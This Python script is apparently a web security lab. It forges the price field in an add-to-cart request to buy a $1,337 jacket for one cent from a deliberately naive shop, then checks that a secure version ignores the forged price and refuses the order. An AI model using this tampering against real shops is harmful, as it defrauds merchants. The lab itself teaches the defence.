"""Lab 1: change the price in the add-to-cart request (Burp Repeater style)."""
from common import (NAIVE, SECURE, db_rows, money, naive_login, report, secure_cart_total,
                    secure_checkout_token, secure_login, SECURE_DB, NAIVE_DB)

JACKET = 2      # Lightweight Leather Jacket, $1,337.00


def run():
    s = naive_login("shopper")
    s.post(NAIVE + "/cart/add", data={"product_id": JACKET, "quantity": 1, "price": 1})
    s.post(NAIVE + "/checkout/pay")
    order = db_rows(NAIVE_DB, "SELECT total_cents FROM orders ORDER BY id DESC LIMIT 1")[0]
    naive_worked = order["total_cents"] == 1

    s = secure_login("shopper")
    s.post(SECURE + "/cart/add", data={"product_id": JACKET, "quantity": 1, "price": 1, "total": 1})
    total = secure_cart_total(s)
    orders_before = len(db_rows(SECURE_DB, "SELECT id FROM orders"))
    page = s.post(SECURE + "/checkout/pay", data={"checkout_token": secure_checkout_token(s),
                                                  "total": 1, "price": 1}).text
    orders_after = len(db_rows(SECURE_DB, "SELECT id FROM orders"))
    s.post(SECURE + "/cart/remove", data={"product_id": JACKET})
    blocked = total == "$1,337.00" and orders_after == orders_before
    refused = "refused - not enough credit" if "Not enough store credit" in page else "no order"
    return report("Price tampering (Lab 1)", naive_worked, f"paid {money(order['total_cents'])} for the jacket",
                  blocked, f"price from database: {total}, payment {refused}")


if __name__ == "__main__":
    run()
